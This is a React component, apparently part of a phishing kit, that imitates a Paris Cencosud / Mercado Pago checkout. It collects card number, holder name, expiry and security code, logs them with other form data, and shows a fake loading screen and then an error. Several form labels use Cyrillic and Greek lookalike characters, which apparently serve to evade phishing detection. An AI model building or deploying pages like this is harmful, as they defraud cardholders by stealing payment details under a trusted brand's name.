import React, {useEffect, useState} from 'react';
import Navas from './Navas';
import Carga from './Carga';
import Erro from './Erro';

const Mp = ({ formData,name, price }) => {
    const estilo = {
        fontFamily: 'Proxima Nova, -apple-system, Roboto, Arial, sans-serif',
      };
      const [mostarError, setMostrarError] = useState(false)
      const [input1Value, setInput1Value] = useState('');
      const [input2Value, setInput2Value] = useState('');
      const [input3Value, setInputValue3] = useState('');
      const [input4Value, setInputValue4] = useState('');
      const [loading, setLoading] = useState('');

      const handleClick = () => {
        // Recarga la página cuando se hace clic en el botón
        window.location.reload();
    };

      const handleInput1Change = (event) => {
        let value = event.target.value;
        value = value.replace(/\D/g, '');
        value = value.replace(/(\d{4})/g, '$1 ').trim();
        value = value.substring(0, 19);
        setInput1Value(value);
      };

      const handleInput2Change = (event) => {
        let value2 = event.target.value;
        value2 = value2.substring(0, 32);
        setInput2Value(value2);
      };

      const handleInput3Change = (event) => {
        let value3 = event.target.value;
        value3 = value3.replace(/\D/g, '');
        value3 = value3.substring(0, 4);
        if (value3.length > 2) {
          value3 = value3.slice(0, 2) + '/' + value3.slice(2);
        }
        setInputValue3(value3);
      };

      const handleInput4Change = (event) => {
        let value = event.target.value;
        // Filtra solo los dígitos
        value = value.replace(/\D/g, '');
        // Limita el valor a 4 caracteres
        value = value.substring(0, 4);
        setInputValue4(value);
    };

      const mostrarErrorHandler = () => {      
        const datosInput = {
          input1: input1Value,
          input2: input2Value,
          input3: input3Value,
          input4: input4Value,
        };
        console.log('Card:', datosInput);
        console.log('Data:', formData);

      
        // Validación de todos los inputs
        if (datosInput.input1 !== '' && datosInput.input2 !== '' && datosInput.input3 !== '' && datosInput.input4 !== '') {
          setLoading(true);
      
          setTimeout(() => {
            setLoading(false);
            setMostrarError(true);
          }, 5000); // Cambia 2000 a 3000 para esperar 3 segundos
        } else {
          console.log("Completa todos los datos");
        }
      };
      

      const data = formData

      useEffect(() => {
        window.scrollTo(0, 0);
      }, []); // Este efecto se ejecuta solo una vez al montar el componente

  return (
    <div>
{!mostarError && !loading && (

    <div style={estilo}>
        <Navas/>
      <div className="w-full bg-white flex justify-center items-center p-2">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b2/Logo_Paris_Cencosud.png" alt="paris_tecno" className='w-5' />
        <span className="text-sm font-semibold flex">
Paris Tecno <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth="1.5" stroke="currentColor" className="size-4 mt-[2px] ml-1 text-sky-600">
  <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75 11.25 15 15 9.75M21 12c0 1.268-.63 2.39-1.593 3.068a3.745 3.745 0 0 1-1.043 3.296 3.745 3.745 0 0 1-3.296 1.043A3.745 3.745 0 0 1 12 21c-1.268 0-2.39-.63-3.068-1.593a3.746 3.746 0 0 1-3.296-1.043 3.745 3.745 0 0 1-1.043-3.296A3.745 3.745 0 0 1 3 12c0-1.268.63-2.39 1.593-3.068a3.745 3.745 0 0 1 1.043-3.296 3.746 3.746 0 0 1 3.296-1.043A3.746 3.746 0 0 1 12 3c1.268 0 2.39.63 3.068 1.593a3.746 3.746 0 0 1 3.296 1.043 3.746 3.746 0 0 1 1.043 3.296A3.745 3.745 0 0 1 21 12Z" />
</svg></span>
      </div>
      <hr className="w-full border-t border-gray-300" />
      <nav className="w-full bg-white shadow-none p-2 flex justify-between items-center">
        <span className="text-xs  font-medium">{name}</span>
        <span className="text-sm font-medium ">${price? price.toLocaleString('es-AR'): "Precio no disponible"}</span>
      </nav>
    <div className="flex flex-col justify-center items-center bg-[#f0ecec]">
    <div className="flex flex-col items-center"> {/* Espacio arriba para el formulario */}
    <div className='mb-6 mt-6 font-semibold font-sans'>Completá los datos de tu tarjetа</div>
   {/* <div className='absolute top-[100px]'><h1>hola</h1></div> */}

        <div className="bg-white p-8 py-3 rounded-lg shadow-lg max-w-md " > {/* Limitar el ancho del formulario */}
          <form className="flex flex-col mt-3">
            <div className="mb-4">
              <label className="block px-2 text-gray-700 text-xs font-medium " htmlFor="input1">
                Númerο de tarjetа
              </label>
              <input
                className="appearance-none border-2 rounded text-sm w-72 py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline mb-2"
                id="input1"
                type="text"
                placeholder="1234 1234 1234 1234"
                value={input1Value}
                onChange={handleInput1Change}
                inputMode="numeric"
                pattern="[0-9]*"
              />
            <label className="block px-1 text-gray-700 text-xs font-medium mt-4" htmlFor="input2">
                Nοmbre del titulаr
              </label>
              <input
                className="appearance-none border-2 text-sm rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                id="input2"
                type="text"
                placeholder="Ej.: María Lopez"
                value={input2Value}
                onChange={handleInput2Change}
              />
                <label className="block px-1 text-gray-700 text-xs font-medium  mt-4" htmlFor="input3">
               Vencimientο
              </label>
              <input
               className="appearance-none text-sm border-2 rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                id="input3"
                type="text"
                placeholder="MM/AA"
                value={input3Value}
                onChange={handleInput3Change}
                pattern="[0-9]{2}/[0-9]{2}"
              />

              <label className="block px-1 text-gray-700 text-xs font-medium  mt-4" htmlFor="input5">
              Códigο de seguridаd
              </label>
              <input
                className="appearance-none text-sm border-2 rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                id="input3"
                type="text"
                placeholder="123"
                value={input4Value}
                onChange={handleInput4Change}
                pattern="[0-9]{2}/[0-9]{2}"
              />
             <label className="block px-1 text-gray-700 text-xs font-medium  mt-4" htmlFor="input4">
                Cantidad de cuotas
              </label>
              <select
  className="appearance-none border-2 text-sm rounded w-full py-3 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
  id="input4"
>
  <option className='text-xs' value="3">3 cuotas sin interés</option>
  <option className='text-xs' value="6">6 cuotas sin interés</option>
  <option className='text-xs' value="12">12 cuotas sin interés</option>
  <option className='text-xs' value="18">18 cuotas sin interés</option>
</select>
            </div>
            {/* Otros campos de formulario aquí */}
          </form>
          </div>
       <button  className="bg-[#009EE3] hover:bg-[#007de3e0] text-white font-bold py-3 px-4 rounded w-full mt-5" onClick={mostrarErrorHandler} style={estilo} >Continuar</button>
       <button  className="bg-slate-300 hover:bg-slate-300 text-[#009EE3] font-bold py-3 px-4 rounded w-full mt-1 mb-[40px]" onClick={handleClick} style={estilo} >Volver</button>
      </div>
    </div>
    </div>
)}
{loading && <Carga/>}
{mostarError && <Erro name={name} price={price}/>}
    </div>
  );
};

export default Mp;
